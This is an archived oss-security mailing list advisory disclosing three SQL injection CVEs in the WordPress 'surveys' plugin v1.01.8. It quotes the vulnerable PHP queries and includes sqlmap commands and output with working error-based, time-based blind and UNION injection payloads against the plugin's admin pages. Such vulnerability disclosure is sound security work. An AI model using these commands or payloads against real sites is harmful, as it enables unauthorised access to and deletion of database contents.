X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5881" "Tuesday" "30" "May" "2017" "07:37:45" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<32370AEB-2D6B-40B7-8E3B-9EC152BDDDBC@me.com>" "127" "[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8" nil nil nil "5" "2017053011:37:45" "[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8" (number mark "U       larry0@me.co May 30  127/5881  " thread-indent "\"[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15847 invoked by uid 550); 30 May 2017 11:38:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15363 invoked from network); 30 May 2017 11:38:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1496144269; bh=uNs/tTR91SVMCon+BFTdy23OY/uV5dWCOFKG97KPlh8=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=ctU2VFCfSc5GKsHfRBai9wYH4mPDB/T9jFReeHv0eSRMyNaXcULYfJhgH8GWrDCz3
 vUCXL3BHMTIE98oCTFtYYXHbdN1n/DyVyK4q8kjs4fHgh+z8ezH14z4lVrYeC3QSvn
 mTjFyTbKDwEg4edcOL0EDq6ZU83Uh0OJY1nIp+cLbdO8ctgXVQPuBjlNONkCwZt/i0
 DQwjmvGGuDqUIu454KicN50+WoPhvmfAPDenBQqsdgWbQKV0Fr2ps+C5pGsYtM7mG9
 yGXwrvWcUFxB+Kc68t/WLgrwSQrOr8CYWofQjlQuzie/WefJJvDXbD9qfl42Za1Zkk
 2tlWxKZNQXbFQ==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-05-30_08:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1705300223
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <32370AEB-2D6B-40B7-8E3B-9EC152BDDDBC@me.com>
Date: Tue, 30 May 2017 07:37:45 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] SQL Injection in Wordpress plugin surveys v1.01.8

Title: SQL Injection in Wordpress plugin surveys v1.01.8
Author: Larry W. Cashdollar, @_larry0
Date: 2017-05-21
CVE-ID:[CVE-2017-1002020][CVE-2017-1002021][CVE-2017-1002022]
Download Site: https://wordpress.org/plugins/surveys/
Vendor: http://www.binnyva.com/
Vendor Notified: 2017-05-22
Vendor Contact: binnyva@gmail.com
Advisory: http://www.vapidlabs.com/advisory.php?v=3D193
Description: The Surveys WordPress plugin lets you add surveys to your blog=
. You can let the visitors take surveys and see the result from the admin s=
ide.
Vulnerability:
CVE-2017-1002020:

The following code in survey_form.php does not sanitize $_REQUEST['action']=
 before placing it inside of an SQL query:

10:	$survey_details =3D $wpdb->get_row("SELECT name,description,status FROM=
 {$wpdb->prefix}surveys_survey WHERE ID=3D$_REQUEST[survey]");

CVE-2017-1002021:

The following code in individual_responses.php does not sanitize input from=
 $survey_id or $_REQUEST[result] before placing it inside of an SQL query:


  5 $survey_id =3D $_REQUEST['survey'];
  6 $survey_details =3D $wpdb->get_row("SELECT ID, name FROM {$wpdb->prefix=
}surveys_survey WHERE ID=3D$survey_id");
  7=20
  8 if(isset($_REQUEST['action']) and $_REQUEST['action'] =3D=3D 'delete') {
  9         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result_answer =
WHERE result_ID=3D$_REQUEST[result]");
 10         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result WHERE I=
D=3D$_REQUEST[result]");

CVE-2017-1002022:

In questions.php $_REQUEST[survey] is injectable as it is passed directly i=
nto the SQL statement:
94 $all_question =3D $wpdb->get_results("SELECT Q.ID,Q.question,(SELECT COU=
NT(*) FROM {$wpdb->prefix}surveys_answer WHERE question_id=3DQ.ID) AS answe=
r_count
 95                                                                        =
         FROM {$wpdb->prefix}surveys_question AS Q
 96                                                                        =
         WHERE Q.survey_id=3D$_REQUEST[survey]");


Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://192.168.0.169/wordpress/wp-admin/edit.php?pa=
ge=3Dsurveys%2Fsurvey_form.php&survey=3D*&action=3Dedit' --dbms mysql  --le=
vel 1 --risk 1 --load-cookies=3D./cookies.txt
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 [22:45:22] [INFO] URI parameter '#1*' is 'MySQL UNION query (ran=
dom number) - 1 to 20 columns' injectable
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1913 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: error-based
	=E2=80=A2     Title: MySQL >=3D 5.0 error-based - Parameter replace (FLOOR)
	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
?page=3Dsurveys/survey_form.php&survey=3D(SELECT 8079 FROM(SELECT COUNT(*),=
CONCAT(0x7162767171,(SELECT (ELT(8079=3D8079,1))),0x71706b7171,FLOOR(RAND(0=
)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&action=3Dedit
	=E2=80=A2=20=20
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
?page=3Dsurveys/survey_form.php&survey=3D(CASE WHEN (5824=3D5824) THEN SLEE=
P(5) ELSE 5824 END)&action=3Dedit
	=E2=80=A2=20=20
	=E2=80=A2     Type: UNION query
	=E2=80=A2     Title: MySQL UNION query (random number) - 3 columns
	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
?page=3Dsurveys/survey_form.php&survey=3D-3195 UNION ALL SELECT 1509,CONCAT=
(0x7162767171,0x49776a5a4456614e5446634579746a735757586f66776e5145566a776c4=
5797256735a4d476f7170,0x71706b7171),1509#&action=3Dedit
	=E2=80=A2 ---
	=E2=80=A2 [22:45:25] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0
	=E2=80=A2 [22:45:25] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/192.168.0.169'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 22:45:25
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
=3Dsurveys%2Fquestion.php&survey=3D*' --dbms mysql  --level 3 --risk 3 --lo=
ad-cookies=3D./cookies.txt
	=E2=80=A2=20=20
	=E2=80=A2 [14:12:16] [INFO] URI parameter '#1*' is 'Generic UNION query (r=
andom number) - 1 to 20 columns' injectable
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1252 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
e (substraction)
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
age=3Dsurveys/question.php&survey=3D(SELECT * FROM (SELECT(SLEEP(5)))rwrG)
	=E2=80=A2=20=20
	=E2=80=A2     Type: UNION query
	=E2=80=A2     Title: Generic UNION query (random number) - 3 columns
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
age=3Dsurveys/question.php&survey=3D-3214 UNION ALL SELECT CONCAT(0x716b787=
671,0x5464416c58704b4b44675145455a565a61594371676143554e705851457371584b754=
27a5641666d,0x7178627871),7176,7176-- yWXG
	=E2=80=A2 ---
	=E2=80=A2 [14:12:18] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [14:12:18] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 14:12:18=
